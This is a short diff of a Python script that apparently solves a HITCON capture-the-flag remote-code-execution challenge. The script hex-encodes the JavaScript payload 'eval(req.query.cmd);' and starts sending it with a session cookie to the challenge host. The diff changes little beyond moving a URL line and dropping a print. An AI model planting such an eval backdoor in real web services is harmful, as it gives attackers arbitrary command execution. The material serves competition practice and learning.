@@ -2,14 +2,14 @@ import requests
 import codecs
 
 url1 = "http://2k6gre4bmq.rce.chal.hitconctf.com/"
+url = url1 + '/random'
 
 command_hex = codecs.encode(b'eval(req.query.cmd);', "hex")
 print(command_hex)
 
 responseInitial = requests.get(url1)
 initial_cookie = responseInitial.cookies.get_dict()['code']
-print(initial_cookie)
-url = url1 + '/random'
+
 cookies = {'code': initial_cookie}
 position = 0
 while True:
